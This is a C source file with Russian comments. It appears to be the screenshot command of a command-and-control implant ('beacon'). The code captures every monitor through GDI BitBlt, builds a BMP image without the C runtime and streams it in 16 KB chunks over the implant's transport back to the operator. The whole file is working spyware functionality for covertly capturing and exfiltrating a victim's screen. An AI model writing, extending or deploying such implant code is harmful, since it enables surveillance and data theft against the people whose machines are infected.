// cmd_screenshot.c — захват экрана через GDI BitBlt → 24-bit BMP → RESP_FILE.
//
// Использует виртуальный экран (SM_CXVIRTUALSCREEN/SM_CYVIRTUALSCREEN) чтобы
// захватить все мониторы сразу. Результат кодируется как BMP-файл без CRT
// и передаётся как RESP_FILE (клиент сохраняет на диск автоматически).
//
// Требует gdi32 (уже добавлен в CMakeLists.txt).
//
// Размер: 1920×1080 × 24 бит ≈ 6 МБ — не помещается в один out_buf (512 KB),
// поэтому данные передаются чанками, точно как cmd_download.

#include <windows.h>
#include "../core/beacon.h"

// BMP file header (packed, без выравнивания компилятора).
#pragma pack(push, 1)
typedef struct {
    WORD  bfType;       // 0x4D42 = 'BM'
    DWORD bfSize;       // общий размер файла
    WORD  bfReserved1;
    WORD  bfReserved2;
    DWORD bfOffBits;    // смещение пиксельных данных от начала файла
} BmpFileHdr;
#pragma pack(pop)

void cmd_screenshot(const BeaconTask* t) {
    (void)t;

    // Попытка захватить весь виртуальный экран (несколько мониторов).
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int ox = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int oy = GetSystemMetrics(SM_YVIRTUALSCREEN);

    // Fallback на основной монитор если виртуальный экран недоступен.
    if (cx <= 0 || cy <= 0) {
        cx = GetSystemMetrics(SM_CXSCREEN);
        cy = GetSystemMetrics(SM_CYSCREEN);
        ox = 0; oy = 0;
    }

    HDC hScreen = GetDC(NULL);
    if (!hScreen) {
        const char msg[] = "[!] screenshot: GetDC(NULL) failed\n";
        out_write(msg, sizeof(msg) - 1);
        return;
    }

    HDC hMem = CreateCompatibleDC(hScreen);
    if (!hMem) {
        ReleaseDC(NULL, hScreen);
        const char msg[] = "[!] screenshot: CreateCompatibleDC failed\n";
        out_write(msg, sizeof(msg) - 1);
        return;
    }

    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, cx, cy);
    if (!hBmp) {
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        const char msg[] = "[!] screenshot: CreateCompatibleBitmap failed\n";
        out_write(msg, sizeof(msg) - 1);
        return;
    }

    // Захват экрана в memory DC.
    HGDIOBJ hOld = SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, cx, cy, hScreen, ox, oy, SRCCOPY | CAPTUREBLT);
    SelectObject(hMem, hOld);

    // DIB info header — 24-bit, top-down (biHeight < 0).
    BITMAPINFOHEADER bi;
    rt_memset(&bi, 0, sizeof(bi));
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = cx;
    bi.biHeight      = -cy;   // отрицательный → строки сверху вниз
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;

    // Размер строки выровнен по 4 байтам (требование BMP).
    DWORD rowStride = ((DWORD)(cx * 3u) + 3u) & ~3u;
    DWORD bmpBytes  = rowStride * (DWORD)cy;

    uint8_t* pix = (uint8_t*)bmalloc((size_t)bmpBytes);
    if (!pix) {
        DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        const char msg[] = "[!] screenshot: out of memory\n";
        out_write(msg, sizeof(msg) - 1);
        return;
    }

    // Копируем пиксели из HBITMAP в буфер.
    GetDIBits(hMem, hBmp, 0, (UINT)cy, pix, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // Освобождаем GDI-ресурсы — пиксели уже в pix, GDI больше не нужен.
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);

    // Строим BITMAPFILEHEADER.
    BmpFileHdr fh;
    DWORD hdrsz    = (DWORD)(sizeof(BmpFileHdr) + sizeof(BITMAPINFOHEADER));
    fh.bfType      = 0x4D42u;
    fh.bfSize      = hdrsz + bmpBytes;
    fh.bfReserved1 = 0;
    fh.bfReserved2 = 0;
    fh.bfOffBits   = hdrsz;

    // Получаем транспорт для чанкового вывода (аналог cmd_download).
    const TransportVtbl* tv = get_transport();

    // Записываем заголовки (54 байта — умещаются в буфер без flush).
    out_write(&fh, sizeof(fh));
    out_write(&bi, sizeof(bi));

    // Записываем пиксели чанками по 16 KB — тот же паттерн что cmd_download.
    // Буфер out_buf = 512 KB; при заполнении шлём промежуточный кадр (is_last=0).
    static const DWORD CHUNK = 16u * 1024u;
    DWORD sent = 0;
    while (sent < bmpBytes) {
        DWORD n = bmpBytes - sent;
        if (n > CHUNK) n = CHUNK;
        out_write(pix + sent, n);
        sent += n;
        // Если в буфере почти не осталось места — шлём промежуточный кадр.
        if (out_remaining() < CHUNK)
            out_flush_chunk(tv, 0);
    }

    bfree(pix);

    // Финальный кадр (is_last=1) — аналог конца cmd_download.
    out_flush_chunk(tv, 1);
}
